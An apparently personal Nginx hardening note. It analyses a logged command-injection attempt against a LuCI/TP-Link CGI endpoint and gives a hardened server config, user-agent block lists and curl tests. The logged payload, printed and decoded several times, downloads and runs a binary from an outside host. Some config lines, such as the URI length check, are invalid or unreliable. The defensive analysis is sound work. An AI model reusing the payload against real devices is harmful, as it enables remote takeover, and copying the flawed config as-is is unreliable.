# Nginx security notes

## Malicious attempt description
The output you've provided appears to be an entry from a web server access log. Let's break down what each part of this log entry represents:

- **`webserver`**: This is the identifier for the service or container that generated the log entry.
- **`183.81.169.139`**: This is the IP address of the client that made the HTTP request.
- **`- -`**: These hyphens typically represent placeholders for the remote user identity and authenticated user identity, which may not be available or relevant in this context.
- **`[10/May/2024:06:44:22 +0000]`**: This is the timestamp indicating when the request was made, in the format `[day/month/year:hour:minute:second timezone]`.
- **`"GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1"`**: This part represents the HTTP request made by the client. It includes:
  - **`GET`**: The HTTP method used (`GET` in this case).
  - **`/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)`**: The requested URI, which appears to contain a malicious command injection attempt (`$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)`). This attempt tries to execute arbitrary commands on the server.
  - **`HTTP/1.1`**: The HTTP protocol version used for the request.
- **`200`**: The HTTP status code returned by the server in response to this request (`200` indicates a successful response).
- **`1312`**: The size of the response in bytes.
- **`"-" "Go-http-client/1.1" "-"`**: Additional details about the request, including the user agent (`Go-http-client/1.1`), which indicates that the request was made by a Go HTTP client.

This log entry suggests that a client (with the IP address `183.81.169.139`) attempted to exploit a vulnerability by injecting a malicious command into a URI path (`/cgi-bin/luci/;stok=/locale?...`). This kind of activity represents a serious security threat and indicates an attempt to compromise the server.

### Detailed explanation of the GET request

Let's break down and analyze the components of the provided GET request:

```
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1
```

1. **Request Method**: `GET`
   - This specifies that the client is attempting to retrieve data from the server using the HTTP `GET` method.

2. **Request URI**: `/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)`
   - The URI path begins with `/cgi-bin/luci/`, which suggests an attempt to access a Luci-based CGI script or interface.
   - The query string `;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)` follows, containing parameters and values.

3. **Query Parameters**:
   - `form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)`
   - The parameters `form`, `operation`, and `country` are set.
   - `country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)` appears to be a malicious payload injected into the `country` parameter.

4. **Malicious Payload**:
   - `country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)`
   - The payload in the `country` parameter is an attempt to execute arbitrary commands on the server:
     - `$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F174.138.2.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)`
     - The payload uses URL encoding (`%3E`, `%60`, `%2F`, etc.) to obfuscate characters.
     - Breakdown of commands:
       1. Change directory (`cd`) to `/tmp`.
       2. Remove (`rm -rf`) the directory named `shk`.
       3. Download (`wget`) a file (`http://174.138.2.237/shk`).
       4. Set execute permissions (`chmod 777`) on the downloaded file (`shk`).
       5. Execute (`./shk`) the downloaded file with the argument `tplink`.
       6. Remove (`rm -rf`) the downloaded file (`shk`).

5. **Intentions**:
   - The intentions of this malicious request are to exploit a command injection vulnerability on the server.
   - By injecting this payload into the URI, the attacker aims to execute arbitrary commands with elevated privileges (`chmod 777`) and potentially download and execute additional malicious code (`./shk`).

**Analysis**:
- This request poses a severe security risk and indicates an attempt to compromise the server by exploiting a vulnerability in the CGI script (`/cgi-bin/luci/`) or related functionality.

## Probably hardened setup

To implement general security measures across all folders of your NGINX container running on Alpine Linux, you can configure the NGINX server block to include directives that enhance security, including location-based blocking, input validation, and regular expression matching. Below is an example configuration you can apply to your NGINX setup:

```conf
server {
    listen 80 default_server;
    server_name _;

    # Set maximum request size to protect against DoS attacks
    client_max_body_size 10M; # This includes static files like jpeg pictures, so 10M is a good idea I think.

    # Disable access to specific directories
    location ~* ^/(cgi-bin|scripts)/ {
        deny all;
        return 403;
    }

    # Limit request methods to only GET and POST
    if ($request_method !~ ^(GET|POST)$ ) {
        return 405;
    }

    # Block requests with excessive URL length
    if ($request_uri length > 200) {
        return 414;
    }

    # Prevent execution of PHP files in specific directories
    location ~* ^/uploads/.*\.php$ {
        deny all;
        return 403;
    }

    # Disable direct access to .htaccess files
    location ~ /\.ht {
        deny all;
        return 403;
    }

    # Block specific user agents known for malicious behavior
    if ($http_user_agent ~* (wget|curl|python|nikto|sqlmap)) {
        return 403;
    }

    # Prevent access to hidden files
    location ~ /\. {
        deny all;
        access_log off;
        log_not_found off;
    }

    # Redirect server error pages to a custom error page
    error_page 403 /error_pages/403.html;
    error_page 404 /error_pages/404.html;
    error_page 500 /error_pages/500.html;

    # Include additional security headers
    add_header X-Frame-Options "SAMEORIGIN";
    #add_header X-XSS-Protection "1; mode=block"; # do not use, it's depricated
    add_header X-Content-Type-Options "nosniff";

    # Set up custom error pages
    location /error_pages {
        internal;
        root /var/www/html;
    }

    # Proxy pass requests to the Laravel app container (adjust as needed)
    location / {
        proxy_pass http://laravel_app:8000; # Adjust port as needed
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

### Explanation:

- **`client_max_body_size`:** Sets the maximum allowed size of the client request body. Helps protect against DoS attacks by limiting large request sizes.

- **Location Blocks (`location ~* ^/(cgi-bin|scripts)/ { ... }`):** Blocks access to specific directories (e.g., `cgi-bin`, `scripts`) and returns a 403 Forbidden error.

- **Request Method Limiting (`if ($request_method !~ ^(GET|POST)$ ) { ... }`):** Restricts requests to only `GET` and `POST` methods.

- **URL Length Limiting (`if ($request_uri length > 200) { ... }`):** Blocks requests with excessively long URLs to prevent buffer overflow attacks.

- **PHP File Execution Prevention (`location ~* ^/uploads/.*\.php$ { ... }`):** Denies access to PHP files within specific directories like `uploads`.

- **Hidden File Access Prevention (`location ~ /\. { ... }`):** Denies access to hidden files (files starting with a dot) and disables logging for these requests.

- **Custom Error Pages (`error_page ...`):** Sets up custom error pages for 403, 404, and 500 errors.

- **Security Headers (`add_header ...`):** Adds security headers like `X-Frame-Options`, `X-XSS-Protection`, and `X-Content-Type-Options` to enhance security.

- **Proxy Pass (`location / { ... }`):** Proxies requests to the backend Laravel app container. Replace `laravel_app:8000` with the appropriate URL and port of your Laravel container.

### Integration with Your Setup:

1. Replace the placeholders (`laravel_app:8000`, `/var/www/html`, etc.) with your actual container names, ports, and directory paths.

2. Save this configuration to your NGINX container's default configuration file (e.g., `/etc/nginx/nginx.conf` or `/etc/nginx/conf.d/default.conf`).

3. Reload NGINX for the changes to take effect (`nginx -s reload`).

4. Test the configuration to ensure it works as expected and provides the desired level of security against malicious requests.

## My addition:

```conf
    # Disable access to specific directories
    location ~* ^/(bin|dev|etc|home|lib|media|mnt|opt|proc|root|run|sbin|srv|sys|tmp|usr|var|cgi-bin|scripts)/ {
        deny all;
        return 403;
    }

    # Block specific user agents known for malicious behavior
    if ($http_user_agent ~* (wget|curl|python|nikto|sqlmap|Go-http-client|Go)) {
    return 403;
    }
```    

To test user agents:
```bash
curl -v -H "User-Agent: Go-http-client/1.1" http://localhost:80/
```

To block long urls:
```conf
    # Use regular expression to deny requests with too long url
    location ~ '.{101,}?' {
    return 403;
    }
```

To test it (User agent needs to be renamed because I block curl)
IT is important that the part after the localhost:80/ needs to be longer than 101 chars for the test to work!!!!
```bash
curl -v -H "User-Agent: I-made-it-up" http://localhost:80/very/long/url/that/exceeds/the/maximum/length/allowed/for/nginx/testing/purposesasasaaaaaaaaaaaaaaaaaaaaa
```

Just added this, why not:
```conf
 # Limit request methods to only GET and POST
    if ($request_method !~ ^(GET|POST)$ ) {
        return 405;
    }
```    